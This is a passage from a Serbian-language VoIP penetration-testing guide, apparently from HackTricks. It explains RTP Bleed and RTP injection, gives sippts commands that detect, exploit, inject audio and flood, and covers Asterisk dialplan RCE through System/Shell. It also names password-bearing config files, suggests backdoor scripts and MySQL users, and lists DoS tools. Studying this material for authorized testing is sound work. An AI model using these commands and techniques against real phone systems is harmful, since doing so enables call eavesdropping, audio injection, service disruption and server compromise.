RTP proxy serveri poku≈°avaju da re≈°e **NAT ograniƒçenja** koja pogaƒëaju RTC sisteme posredstvom posredovanja RTP tokova izmeƒëu dve ili vi≈°e strana. Kada je NAT prisutan, softver RTP proxy servera ƒçesto ne mo≈æe da se osloni na informacije o RTP IP adresi i portu dobijene putem signalizacije (npr. SIP). Stoga, nekoliko RTP proxy servera je implementiralo mehanizam gde se takav **IP i port tuplet automatski uƒçi**. Ovo se ƒçesto posti≈æe inspekcijom dolaznog RTP saobraƒáaja i oznaƒçavanjem izvorne IP adrese i porta za bilo koji dolazni RTP saobraƒáaj kao onaj na koji treba odgovoriti. Ovaj mehanizam, koji se mo≈æe nazvati "re≈æim uƒçenja", **ne koristi nikakvu vrstu autentifikacije**. Stoga **napadaƒçi** mogu **slati RTP saobraƒáaj ka RTP proxy serveru** i primati posredovan RTP saobraƒáaj namenjen pozivaocu ili pozvanoj strani tokom postojeƒáeg RTP toka. Ovu ranjivost nazivamo RTP Bleed jer omoguƒáava napadaƒçima da primaju RTP medijske tokove namenjene legitimnim korisnicima.

Jo≈° jedno interesantno pona≈°anje RTP proxy servera i RTP stack-ova je da ponekad, **ƒçak i ako nisu ranjivi na RTP Bleed**, oni ƒáe **prihvatiti, proslediti i/ili obraditi RTP pakete sa bilo kog izvora**. Stoga napadaƒçi mogu slati RTP pakete koji im mogu omoguƒáiti da ubace svoj medijski sadr≈æaj umesto legitimnog. Ovaj napad nazivamo RTP ubacivanje jer omoguƒáava ubacivanje nelegitimnih RTP paketa u postojeƒáe RTP tokove. Ova ranjivost mo≈æe biti prisutna i kod RTP proxy servera i kod krajnjih taƒçaka.

Asterisk i FreePBX su tradicionalno koristili postavku **`NAT=yes`**, koja omoguƒáava da RTP saobraƒáaj zaobiƒëe autentifikaciju, ≈°to potencijalno mo≈æe dovesti do nedostatka zvuka ili jednosmernog zvuka tokom poziva.

Za vi≈°e informacija posetite [https://www.rtpbleed.com/](https://www.rtpbleed.com/)

* **`SIPPTS rtpbleed`** sa [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS rtpbleed otkriva ranjivost RTP Bleed slanjem RTP tokova.
```bash
sippts rtpbleed -i 10.10.0.10
```
* **`SIPPTS rtcpbleed`** sa [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS rtcpbleed otkriva ranjivost RTP Bleed slanjem RTCP tokova.
```bash
sippts rtcpbleed -i 10.10.0.10
```
* **`SIPPTS rtpbleedflood`** sa [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS rtpbleedflood iskori≈°ƒáava ranjivost RTP Bleed slanjem RTP tokova.
```bash
sippts rtpbleedflood -i 10.10.0.10 -p 10070 -v
```
* **`SIPPTS rtpbleedinject`** sa [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS rtpbleedinject iskori≈°ƒáava ranjivost RTP Bleed ubacivanjem audio fajla (WAV format).
```bash
sippts rtpbleedinject -i 10.10.0.10 -p 10070 -f audio.wav
```
### RCE

U Asterisku na neki naƒçin uspete da **dodate pravila pro≈°irenja i ponovo ih uƒçitate** (na primer, kompromitovanjem ranjivog web menad≈æerskog servera), moguƒáe je dobiti RCE kori≈°ƒáenjem komande **`System`**.
```scss
same => n,System(echo "Called at $(date)" >> /tmp/call_log.txt)
```
Postoji komanda nazvana **`Shell`** koja se mo≈æe koristiti umesto `System` za izvr≈°avanje sistemskih komandi ako je potrebno.

{% hint style="warning" %}
Ako server **onemoguƒáava kori≈°ƒáenje odreƒëenih karaktera** u komandi **`System`** (kao u Elastixu), proverite da li veb server dozvoljava **kreiranje fajlova na neki naƒçin unutar sistema** (kao u Elastixu ili trixboxu), i koristite to da **kreirate skriptu za vrata pozadi** i zatim koristite **`System`** da je **izvr≈°ite**.
{% endhint %}

#### Zanimljivi lokalni fajlovi i dozvole

* **`sip.conf`** -> Sadr≈æi ≈°ifru SIP korisnika.
* Ako **Asterisk server radi kao root**, mogli biste ugroziti root
* **mysql root korisnik** mo≈æda **nema nikakvu ≈°ifru**.
* ovo se mo≈æe iskoristiti za kreiranje novog mysql korisnika kao vrata pozadi
* **`FreePBX`**
* **`amportal.conf`** -> Sadr≈æi ≈°ifru administratora veb panela (FreePBX)
* **`FreePBX.conf`** -> Sadr≈æi ≈°ifru korisnika FreePBXuser koji se koristi za pristup bazi podataka
* ovo se mo≈æe iskoristiti za kreiranje novog mysql korisnika kao vrata pozadi
* **`Elastix`**
* **`Elastix.conf`** -> Sadr≈æi nekoliko ≈°ifri u ƒçistom tekstu poput mysql root ≈°ifre, IMAPd ≈°ifre, ≈°ifre za web admina
* **Nekoliko foldera** ƒáe pripadati kompromitovanom asterisk korisniku (ako ne radi kao root). Ovaj korisnik mo≈æe ƒçitati prethodne fajlove i takoƒëe kontroli≈°e konfiguraciju, pa bi mogao naterati Asterisk da uƒçita druge binarne fajlove sa vratima pozadi prilikom izvr≈°avanja.

### RTP Injekcija

Moguƒáe je ubaciti **`.wav`** u razgovore koristeƒái alate poput **`rtpinsertsound`** (`sudo apt install rtpinsertsound`) i **`rtpmixsound`** (`sudo apt install rtpmixsound`).

Ili mo≈æete koristiti skripte sa [http://blog.pepelux.org/2011/09/13/inyectando-trafico-rtp-en-una-conversacion-voip/](http://blog.pepelux.org/2011/09/13/inyectando-trafico-rtp-en-una-conversacion-voip/) da **skenirate razgovore** (**`rtpscan.pl`**), po≈°aljete `.wav` u razgovor (**`rtpsend.pl`**) i **ubacite buku** u razgovor (**`rtpflood.pl`**).

### DoS

Postoji nekoliko naƒçina da se poku≈°a postiƒái DoS na VoIP serverima.

* **`SIPPTS flood`** sa [**sippts**](https://github.com/Pepelux/sippts)**: SIPPTS flood ≈°alje neograniƒçene poruke cilju.
* `sippts flood -i 10.10.0.10 -m invite -v`
* **`SIPPTS ping`** sa [**sippts**](https://github.com/Pepelux/sippts)**: SIPPTS ping pravi SIP ping da vidi vreme odgovora servera.
* `sippts ping -i 10.10.0.10`
* [**IAXFlooder**](https://www.kali.org/tools/iaxflood/): DoS IAX protokol koji koristi Asterisk
* [**inviteflood**](https://github.com/foreni-packages/inviteflood/blob/master/inviteflood/Readme.txt): Alat za izvoƒëenje SIP/SDP INVITE poruka preplavljenja preko UDP/IP.
* [**rtpflood**](https://www.kali.org/tools/rtpflood/): Slanje nekoliko dobro oblikovanih RTP paketa. Potrebno je znati koje se RTP porte koriste (prvo snifujte).
* [**SIPp**](https://github.com/SIPp/sipp): Omoguƒáava analizu i generisanje SIP saobraƒáaja, pa se mo≈æe koristiti i za DoS.
* [**SIPsak**](https://github.com/nils-ohlmeier/sipsak): SIP ≈°vajcarski no≈æ. Mo≈æe se koristiti i za izvoƒëenje SIP napada.
* Fuzzeri: [**protos-sip**](https://www.kali.org/tools/protos-sip/), [**voiper**](https://github.com/gremwell/voiper).

### OS Ranjivosti

Najlak≈°i naƒçin za instaliranje softvera poput Asteriska je preuzimanje **OS distribucije** u kojoj je veƒá instaliran, kao ≈°to su: **FreePBX, Elastix, Trixbox**... Problem sa njima je ≈°to kada jednom prorade, sistem administratori mo≈æda ih **neƒáe a≈æurirati ponovo** i **ranjivosti** ƒáe biti otkrivene vremenom.

## Reference

* [https://github.com/Pepelux/sippts/wiki](https://github.com/Pepelux/sippts/wiki)
* [https://github.com/EnableSecurity/sipvicious](https://github.com/EnableSecurity/sipvicious)
* [http://blog.pepelux.org/](http://blog.pepelux.org/)
* [https://www.rtpbleed.com/](https://www.rtpbleed.com/)
* [https://medium.com/vartai-security/practical-voip-penetration-testing-a1791602e1b4](https://medium.com/vartai-security/practical-voip-penetration-testing-a1791602e1b4)
* [https://resources.enablesecurity.com/resources/sipdigestleak-tut.pdf](https://resources.enablesecurity.com/resources/sipdigestleak-tut.pdf)

<details>

<summary><strong>Nauƒçite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi naƒçini podr≈°ke HackTricks-u:

* Ako ≈æelite da vidite **va≈°u kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** Proverite [**PLANOVE ZA PRIJAVU**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvaniƒçni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), na≈°u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridru≈æite se** üí¨ [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
